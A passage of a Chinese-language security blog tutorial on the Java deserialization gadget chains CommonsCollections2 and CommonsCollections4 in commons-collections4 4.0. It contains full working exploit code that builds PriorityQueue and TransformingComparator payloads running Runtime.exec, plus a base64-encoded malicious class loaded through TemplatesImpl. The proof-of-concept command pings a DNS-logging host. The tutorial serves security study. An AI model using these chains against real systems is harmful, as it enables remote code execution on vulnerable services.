---
layout: mypost
title: "孪生链-CommonsCollections2&4链"
categories: [Java安全]
---

## 前言

如题，孪生链⛓️‍💥。它们这两条链大同小异，它们都只出现在如下的这个依赖中，即`commons-collections4 4.0`中-->

```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
```

这两条链的EntryClass与Gadget一模一样，区别在于CommonsCollections2的Sink是`InvokerTransformer.transform()`，一次单纯的命令执行（当然也能用它进一步去loadClass，或者是调用TemplatesImpl去加载恶意字节码），而CommonsCollections4的Sink是`TemplatesImpl$TransletClassLoader.defineClass()`（InstantiateTransformer.transform()），一次恶意字节码加载，所以两条链大同小异，放一起了。

## 准备工作&历史背景

JDK版本依旧、在Maven依赖中加入commons-collections4 4.0，即前言中写的。注意此时是`commons-collections4 4.0`，而不是`commons-collections 4.0`，这两个依赖是相互独立的！以下是官方的说明：

```
This is a major release: It combines bug fixes, new features and changes to existing features. Most notable changes are: use of generics and other language features introduced in Java 5 (varargs, Iterable), removed deprecated classes / methods and features which are now supported by the JDK, replaced Buffer interface with java.util.Queue, added concept of split maps with respective interfaces Put / Get (see also package splitmap), added new Trie interface together with an implementation of a Patricia Trie. Because of the base package name change, this release can be used together with earlier versions of Commons Collections. The minimal version of the Java platform required to compile and use Commons Collections is Java 5. Users are encouraged to upgrade to this version as, in addition to new features, this release includes numerous bug fixes.
```

官方认为，旧版的 commons-collections 存在一些架构和 API 设计上的不足，若要修复这些问题，将会引入与现有版本不兼容的重大变化。因此，commons-collections4 被定位为一个全新的库，而非对旧版的直接升级。由于两者的命名空间不重叠，因此它们可以共存于同一个项目中。

看commons-collections各个版本的时间线，如下：

![alt text](image-218.png)

不难发现，`commons-collections4 4.0`是在2013-11-27发布的，查阅资料`commons-collections 3.2.1`是2010-03-03发布的，`commons-collections 3.2.2`这个版本是在2015年针对于`commons-collections 3.2.1`版本的漏洞做了修复，`commons-collections4 4.1`这个版本也是在2015去针对`commons-collections4 4.0`版本的漏洞做了修复，所以猜测`commons-collections4 4.0`这个版本应该是有`commons-collections 3.2.1`的所有漏洞的。（CC1、CC6、CC3）

## 验证猜想

看一下CC1（TransformedMap）那条链，把依赖改一改，如下-->

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.TransformedMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, transformedMap);
        serializeObject(instance);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

可以发现IDEA爆红了，如下-->

![alt text](image-219.png)

查看TransformedMap类的Structure，可以发现在`commons-collections4 4.0`这个依赖中，直接将原本在`commons-collections 3.2.1`这个依赖中的`TransformedMap.decorate(xxx)`给删除了，如下-->

![alt text](image-220.png)

直接换成了一个static类型的构造方法-->

![alt text](image-221.png)

小改动，把EXP跟着改一下即可，将`TransformedMap.decorate(map,null,chainedTransformer);`改为`TransformedMap.transformedMap(map,null,chainedTransformer);`，但问题又出现了，如下-->

![alt text](image-222.png)

transformedMap这个方法的逻辑是，判断map的size是否大于0，大于0则进入`decorated.transformMap(map)`，跟进去-->

![alt text](image-223.png)

可以看到循环中直接调用`transformValue(entry.getValue())`，而这个会直接触发告警，如下-->

![alt text](image-224.png)

![alt text](image-48.png)

且此后的返回值是一个LinkedMap-->

![alt text](image-225.png)

这样往后继续执行CC1的剩余部分肯定是不行了，且会报错（LinkedMap类中的UNIXProcess没有继承Serializable接口）。`transformedMap(xxx)`这个函数类似于预编译的意思，不想重复去transform（相同的代码不想执行第二遍），正如注释中所写的-->avoids double transformation!所以会生成一个线程，下一次直接用就好了。

但同时可以发现TransformedMap类还有一个static类型的构造方法`transformingMap(xxx)`，如下

![alt text](image-226.png)

它没有那么多杂七杂八的逻辑，因此直接将`TransformedMap.decorate(map,null,chainedTransformer);`改为`TransformedMap.transformingMap(map,null,chainedTransformer);`即可，执行后一切正常，也成功触发了DNS请求，如下-->

![alt text](image-48.png)

LazyMap的改动也是如此，将`LazyMap.decorate(xxx);`改为`LazyMap.lazyMap(xxx);`即可，那么CommonCollections1（LazyMap）、CommonCollections6、CommonCollections3都是可以在`commons-collections4 4.0`中正常使⽤，这里不赘述了。

## CommonsCollections2

从上面也可以看到，`commons-collections4 4.0`还是对代码做了一些改动的，而ysoserial的作者从下面这处改动中挖掘出了新的Gadget-->

下面是4.0的代码

![alt text](image-227.png)

下面是3.2.1的代码

![alt text](image-228.png)

找不同，嗯嗯，4.0的TransformingComparator类继承了Serializable接口，3.2.1的TransformingComparator类没有继承。接下来开始一步步的构造。

1.还是先搬出之前的EXP，如下-->

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class CommonCollections2 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(null);
    }
}
```

成功触发DNS请求，如下-->

![alt text](image-48.png)

2.接下来是要去找方法中调用`xxx.transform()`的类，xxx可控，且类继承了Serializable接口，嗯嗯没错就是TransformingComparator类。如下-->

![alt text](image-229.png)

其中的`this.transformer`可以通过构造函数去赋值，且构造函数为public，把EXP向下写一点，如下-->

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class CommonCollections2 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        transformingComparator.compare(null, null);
    }
}
```

成功触发DNS请求，如下-->

![alt text](image-48.png)

3.之后就去找方法中调用了`xxx.compare()`的类，最好这个方法是readObject()，最后是没找到，但CommonsCollections2的作者间接的找到了这样的一条Gadget：PriorityQueue.readObject().heapify()-->PriorityQueue.heapify().siftDown()-->PriorityQueue.siftDown().siftDownUsingComparator()-->PriorityQueue.siftDownUsingComparator()含有comparator.compare(xxx)，如下-->

![alt text](image-230.png)

将整个过程用代码实现一下，挺简单的，不啰嗦了，如下-->

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

public class CommonCollections2 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
        serializeObject(priorityQueue);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

执行后DNSlog平台并没有收到回显，`serializeObject(priorityQueue);`这一步是没有报错的，说明其中用到的所有类都继承了Serializable接口，问题肯定出现在`unSerializeObject("ser.bin");`这一步，下断点调试。

成功的进到了`heapify()`方法中，如下-->

![alt text](image-231.png)

但是在`heapify()`方法中，并没有调用`siftDown()`方法，如下-->

![alt text](image-232.png)

观察代码，若想成功的调用到`siftDown()`方法，则必须保证`size >>> 1`表达式的计算🧮结果大于等于1，而size的值可以在如下的位置去增加：

![alt text](image-233.png)

上图中的offer方法在执行`priorityQueue.add(xxx)`的时候会被调用，调用一次，size的值就会增加一次，由于要保证`size >>> 1`表达式的计算结果大于等于1，那么size的值至少为2，则至少要增加两次，也就是至少要调用两次add方法，修改代码如下-->

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

public class CommonCollections2 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);
        serializeObject(priorityQueue);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

执行后发现报错如下-->

![alt text](image-234.png)

且DNSlog平台收到了请求，如下-->

![alt text](image-48.png)

4.EXP在逻辑上是没有问题的，但为什么会报错呢？跟一下代码会发现，其实在序列化之前，`ping 6y7d5.cxsys.spacestabs.top`就已经被执行了，跟一下堆栈，如下-->

![alt text](image-235.png)

原来问题出在`priorityQueue.add(xxx)`这一步，它会去调用`offer(xxx)`方法，`offer(xxx)`方法会去调用`shiftUp()`方法，`shiftUp()`方法会去调用`siftUpUsingComparator()`方法，`siftUpUsingComparator()`方法中也有`comparator.compare(xxx)`，所以接着会继续执行后续构造好的Gadget及Sink，触发DNS请求。

Tips：回到开发人员的角度，PriorityQueue就是一个基于二叉堆的优先队列，优先队列要求每次出队的元素都是优先级最高的元素，而二叉堆每次都可以弹出最小的元素，而元素的大小比较方法可以由用户Comparator指定，则可以把最小和优先级最高绑定在一起，最小的即是优先级最高的。下面举个例子说明：

```java
import java.util.Comparator;
import java.util.PriorityQueue;

class Task {
    private String name;
    private int priority;  // 优先级数值（越小表示优先级越高）

    public Task(String name, int priority) {
        this.name = name;
        this.priority = priority;
    }

    public int getPriority() {
        return priority;
    }

    @Override
    public String toString() {
        return "Task{" + name + ", priority=" + priority + "}";
    }
}

public class PriorityQueueTest {
    public static void main(String[] args) {
        // 自定义 Comparator：比较任务的优先级数值（小的在前）
        Comparator<Task> taskComparator = Comparator.comparingInt(Task::getPriority);
        PriorityQueue<Task> taskQueue = new PriorityQueue<>(taskComparator);

        // 故意打乱顺序
        taskQueue.add(new Task("处理用户登录", 3));
        taskQueue.add(new Task("发送告警邮件", 1));  // 优先级最高（数值最小）
        taskQueue.add(new Task("备份数据库", 5));
        taskQueue.add(new Task("刷新缓存", 2));

        // 按优先级顺序取出任务
        while (!taskQueue.isEmpty()) {
            System.out.println("执行任务: " + taskQueue.poll());
        }
    }
}

```

输出结果

```
执行任务: Task{发送告警邮件, priority=1}
执行任务: Task{刷新缓存, priority=2}
执行任务: Task{处理用户登录, priority=3}
执行任务: Task{备份数据库, priority=5}
```

底层中，`add()`方法相当于给二叉堆插入新节点，二叉堆实现插入的方式是上移（也就是`shiftUp()`），然后调用自定义的比较器（也就是`siftUpUsingComparator()`）。而反序列化需要恢复这个结构的顺序，所以会进行排序（也就是`heapify()`），二叉堆实现排序的方式是下移（也就是`siftDown()`），接着会调用自定义的比较器（也就是`siftDownUsingComparator()`）。这么看，CommonsCollections2这条链也是有迹可循的。

OK回到正题，解决方案很简单，借鉴URLDNS链的思想即可，代码如下-->

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonCollections2 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(new TransformingComparator(new ConstantTransformer(1)));
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class<?> clazzPriorityQueue = priorityQueue.getClass();
        Field field = clazzPriorityQueue.getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        serializeObject(priorityQueue);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

运行后成功触发DNS请求，如下-->

![alt text](image-48.png)

## CommonsCollections4链

也学过Shiro，要想成功利用，EXP中不能包含非Java自身的数组，而CommonsCollections4链就是在CommonsCollections2的基础上加了TemplatesImpl加载字节码技术-->

![alt text](image-236.png)

挺简单的，不在赘述。先将CommonsCollections2链和TemplatesImpl结合起来，代码如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CommonCollections4 {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Class<?> clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(new TransformingComparator(new ConstantTransformer(1)));
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class<?> clazzPriorityQueue = priorityQueue.getClass();
        Field field = clazzPriorityQueue.getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        serializeObject(priorityQueue);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

运行后成功触发DNS请求，如下-->

![alt text](image-48.png)

再将其中的`Transformer[]`替换，其实就是让`new ConstantTransformer(clazz)`这行代码消失，跟一下`transform(xxx)`，看看其中的xxx是否可控，如下-->

![alt text](image-237.png)

![alt text](image-238.png)

而其中c变量的值即是一开始的`priorityQueue.add(2);`中的2，如下-->

![alt text](image-239.png)

所以`transform(xxx)`其中的xxx是可控的，不需要去`new ConstantTransformer(clazz)`，修改即可，代码如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CommonCollections4 {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Class<?> clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl});
        TransformingComparator transformingComparator = new TransformingComparator(instantiateTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(new TransformingComparator(new ConstantTransformer(1)));
        priorityQueue.add(clazz);
        priorityQueue.add(clazz);
        Class<?> clazzPriorityQueue = priorityQueue.getClass();
        Field field = clazzPriorityQueue.getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        serializeObject(priorityQueue);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
